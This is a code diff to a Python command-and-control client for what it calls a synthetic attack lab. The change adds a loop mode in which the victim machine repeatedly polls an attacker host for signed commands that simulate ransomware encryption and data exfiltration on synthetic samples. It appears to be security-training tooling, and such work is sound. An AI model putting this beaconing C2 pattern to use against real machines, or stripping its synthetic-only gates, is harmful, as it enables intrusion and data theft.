@@ -1,15 +1,17 @@
-"""Victim-side one-command C2 client for the synthetic lab.
+"""Victim-side signed C2 client for the synthetic lab.
 
 Run on victim after Kali server is listening: python3 -m victim.c2_client
 With --enable-synthetic-actions, signed START_ENCRYPT runs the copy-only
 containment trial and signed START_EXFIL transfers one fixed synthetic sample.
 Other commands remain dry-run.
+Use --loop --enable-synthetic-actions to arm repeated dashboard actions.
 """
 
 import argparse
 import socket
 import subprocess
 import sys
+import time
 from pathlib import Path
 
 from config import ATTACKER_IP, AUTH_MODE, C2_PORT, PROJECT_ROOT
@@ -103,5 +105,20 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--enable-synthetic-actions", action="store_true",
                         help="Allow signed START_ENCRYPT and START_EXFIL on synthetic samples")
+    parser.add_argument("--loop", action="store_true",
+                        help="Poll for successive allowlisted commands until Ctrl+C")
+    parser.add_argument("--interval", type=float, default=1.0,
+                        help="Seconds between connection attempts in loop mode (0.5 to 5)")
     args = parser.parse_args()
-    receive_once(enable_synthetic_actions=args.enable_synthetic_actions)
+    if not 0.5 <= args.interval <= 5:
+        parser.error("--interval must be between 0.5 and 5 seconds")
+    if args.loop:
+        print("Synthetic C2 agent polling for signed lab commands; Ctrl+C to stop", flush=True)
+        while True:
+            try:
+                receive_once(enable_synthetic_actions=args.enable_synthetic_actions)
+            except (ConnectionRefusedError, TimeoutError, OSError):
+                pass  # A dashboard action has not opened the one-command listener yet.
+            time.sleep(args.interval)
+    else:
+        receive_once(enable_synthetic_actions=args.enable_synthetic_actions)
